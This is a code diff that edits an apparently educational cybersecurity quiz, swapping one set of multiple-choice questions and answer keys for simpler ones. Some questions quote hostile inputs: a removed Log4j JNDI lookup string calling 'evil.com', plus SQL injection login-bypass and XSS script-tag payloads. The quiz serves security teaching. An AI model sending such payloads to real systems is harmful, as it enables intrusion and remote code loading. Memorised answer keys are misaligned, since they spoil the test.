@@ -72,71 +72,71 @@ export const questions: Question[] = [
   {
     id: 11,
     type: 'mcq',
-    text: 'You dump a database and find that the CEO and the Intern have the exact same MD5 password hash: 5f4dcc3b5aa765d61d8327deb882cf99. What critical security control did the database administrator fail to implement before hashing the passwords?',
-    options: ['Salting', 'Encryption', 'Key Derivation', 'Tokenization'],
-    answer: 'Salting'
+    text: 'A user receives an urgent email and clicks a link that reads: https://secure-login.amazon.com-update.net/auth. What exact root domain is this URL actually sending the user to?',
+    options: ['amazon.com', 'secure-login.amazon.com', 'com-update.net', 'amazon.com-update.net'],
+    answer: 'com-update.net'
   },
   {
     id: 12,
     type: 'mcq',
-    text: 'A password reset token is generated using this Python logic: token = MD5(username + time.time()). If an attacker requests a reset link for the admin account, what exact two pieces of data do they need to generate the exact same valid token themselves?',
-    options: ['The admin\'s username and the exact time of the request', 'The admin\'s username and the server\'s secret key', 'The session ID and the admin\'s email address', 'The database password and the admin\'s username'],
-    answer: 'The admin\'s username and the exact time of the request'
+    text: 'You dump a database and find that the CEO and the Intern have the exact same MD5 password hash: 5f4dcc3b5aa765d61d8327deb882cf99. What critical security control did the database administrator fail to implement before hashing the passwords?',
+    options: ['Encryption', 'Salting', 'Multi-Factor Authentication', 'Base64 Encoding'],
+    answer: 'Salting'
   },
   {
     id: 13,
     type: 'mcq',
-    text: 'You notice a spike in traffic where the User-Agent string in the HTTP headers looks like this: ${jndi:ldap://evil.com/a}. The attacker isn\'t targeting the web frontend; what specific backend component are they trying to exploit with this payload?',
-    options: ['The logging framework (Log4j)', 'The database connection pool', 'The reverse proxy server', 'The API rate limiter'],
-    answer: 'The logging framework (Log4j)'
+    text: 'A developer accidentally types their secret API key into their code and runs git commit. They immediately realize their mistake, delete the key from the code, and run git commit again before pushing to GitHub. Where can an attacker still find the deleted API key?',
+    options: ['In the .env.local file', 'In the browser\'s LocalStorage', 'In the Git commit history', 'The key is permanently deleted and safe'],
+    answer: 'In the Git commit history'
   },
   {
     id: 14,
     type: 'mcq',
-    text: 'An attacker intercepts their JSON Web Token (JWT), changes their role from \'user\' to \'admin\', and sends it back. They do not know the server\'s secret key, but the server still accepts it. What algorithm did the attacker specify in the JWT header to successfully bypass the signature check?',
-    options: ['None', 'HS256', 'RS256', 'HMAC'],
-    answer: 'None'
+    text: 'A password reset token is generated using this logic: token = MD5(username + current_time). If an attacker wants to generate a valid reset token for the Admin account, what exact two pieces of data do they need?',
+    options: ['The admin\'s password and email', 'The admin\'s username and the exact time of the request', 'The server\'s IP address and a secret key', 'The database name and the admin\'s username'],
+    answer: 'The admin\'s username and the exact time of the request'
   },
   {
     id: 15,
     type: 'mcq',
-    text: 'A junior admin accidentally plugs both ends of an Ethernet cable into two different ports on the exact same unmanaged network switch. The network immediately crashes. What specific network event has the admin accidentally caused?',
-    options: ['A broadcast storm', 'A MAC address collision', 'A spanning tree failure', 'A DHCP exhaustion'],
-    answer: 'A broadcast storm'
+    text: 'An attacker dressed as a delivery driver waits by a secure office door with a heavy box. An employee swipes their ID badge to unlock the door and politely holds it open for the "driver," unknowingly letting the attacker inside. What is this physical hacking technique called?',
+    options: ['Phishing', 'Tailgating (or Piggybacking)', 'Spoofing', 'Man-in-the-Middle'],
+    answer: 'Tailgating (or Piggybacking)'
   },
   {
     id: 16,
     type: 'mcq',
-    text: 'A hacker finds an SQL injection point, but the website never displays any database errors or data on the screen. It only ever says \'User Found\' or \'User Not Found\'. What specific classification of SQL injection must the hacker use to extract data character-by-character by asking the database True/False questions?',
-    options: ['Blind SQL Injection', 'Time-Based SQL Injection', 'Second-Order SQL Injection', 'Union-Based SQL Injection'],
-    answer: 'Blind SQL Injection'
+    text: 'A user types <script>alert(\'Hacked!\')</script> into a website\'s comment section. When other users visit the page, their browsers execute the script and display a pop-up box. What is the specific name of this vulnerability?',
+    options: ['SQL Injection (SQLi)', 'Cross-Site Scripting (XSS)', 'Denial of Service (DoS)', 'Server-Side Request Forgery (SSRF)'],
+    answer: 'Cross-Site Scripting (XSS)'
   },
   {
     id: 17,
     type: 'mcq',
-    text: 'A user clicks a link that reads: https://secure-login.amazon.com-update.net/auth. Provide the exact root domain (and TLD) that this URL is actually sending the user to.',
-    options: ['com-update.net', 'amazon.com', 'secure-login.amazon.com', 'amazon.com-update'],
-    answer: 'com-update.net'
+    text: 'A hacker finds a login page. Instead of typing a real username, they type \' OR 1=1 --. The database evaluates this math as "True" and logs them in as the first user in the database (usually the Admin). What type of attack is this?',
+    options: ['SQL Injection (SQLi)', 'Cross-Site Scripting (XSS)', 'Brute Force Attack', 'Session Hijacking'],
+    answer: 'SQL Injection (SQLi)'
   },
   {
     id: 18,
     type: 'mcq',
-    text: 'An API uses a custom MAC: hash(secret_key + user_message). An attacker intercepts a valid message and its hash. Without knowing the secret key, they append malicious data to the end of the message and generate a valid new hash. What is the specific name of this cryptographic attack?',
-    options: ['Length Extension Attack', 'Padding Oracle Attack', 'Birthday Attack', 'Meet-in-the-Middle Attack'],
-    answer: 'Length Extension Attack'
+    text: 'A company wants to secure its remote workforce. They require employees to log in using a strong password (something they know) AND a rolling 6-digit code from an app on their phone (something they have). What is the industry term for this?',
+    options: ['End-to-End Encryption (E2EE)', 'Virtual Private Network (VPN)', 'Multi-Factor Authentication (MFA)', 'Single Sign-On (SSO)'],
+    answer: 'Multi-Factor Authentication (MFA)'
   },
   {
     id: 19,
     type: 'mcq',
-    text: 'A developer accidentally hardcodes an API key, types git commit, realizes their mistake, deletes the key, and types git commit again before pushing to GitHub. Where exactly can an attacker still find the deleted API key?',
-    options: ['In the Git commit history', 'In the .gitignore file', 'In the environment variables', 'In the GitHub Actions logs'],
-    answer: 'In the Git commit history'
+    text: 'You plug a brand new smart security camera into your Wi-Fi. Within an hour, a botnet takes control of it because the login was still set to username: admin, password: admin. What security best practice was violated?',
+    options: ['Failure to encrypt the Wi-Fi', 'Failure to change default credentials', 'Failure to install an antivirus', 'Failure to use a VPN'],
+    answer: 'Failure to change default credentials'
   },
   {
     id: 20,
     type: 'mcq',
-    text: 'Alice and Bob generate RSA keys, but they accidentally use a weak random number generator. Their two public moduli (N_A and N_B) happen to share exactly one prime factor in common. What standard mathematical algorithm can an attacker use on N_A and N_B to instantly find that shared prime factor and break both keys?',
-    options: ['The Euclidean Algorithm', 'Pollard\'s Rho Algorithm', 'The Quadratic Sieve', 'Fermat\'s Factorization Method'],
-    answer: 'The Euclidean Algorithm'
+    text: 'An attacker wants to know which specific folders on a website the developer is trying to hide from Google Search. They navigate to a specific text file at the root of the website to read the "Disallow" rules. What is the name of this file?',
+    options: ['index.html', 'config.json', '.env.local', 'robots.txt'],
+    answer: 'robots.txt'
   }
 ]
